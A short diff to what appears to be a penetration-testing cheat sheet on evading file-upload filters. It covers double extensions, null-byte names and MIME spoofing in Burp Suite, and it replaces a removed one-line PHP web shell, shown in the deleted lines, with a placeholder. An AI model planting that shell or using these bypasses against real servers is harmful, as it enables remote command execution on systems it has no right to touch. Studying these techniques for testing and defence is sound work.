@@ -37,10 +37,10 @@ When `.php` is blocked:
    `shell.php.jpg`, `shell.php%00.jpg`, `shell.php.png`
 
 3. Magic bytes and MIME type spoofing:
-   Prepend GIF header bytes to the PHP script:
-   ```php
+   Prepend GIF header bytes to your upload file to bypass file header validation:
+   ```text
    GIF89a;
-   <?php system($_GET['cmd']); ?>
+   [Insert PHP command execution code here, e.g. phpinfo() or system command]
    ```
    In Burp Suite, change `Content-Type: application/x-php` to `Content-Type: image/png` or `image/jpeg`.
 
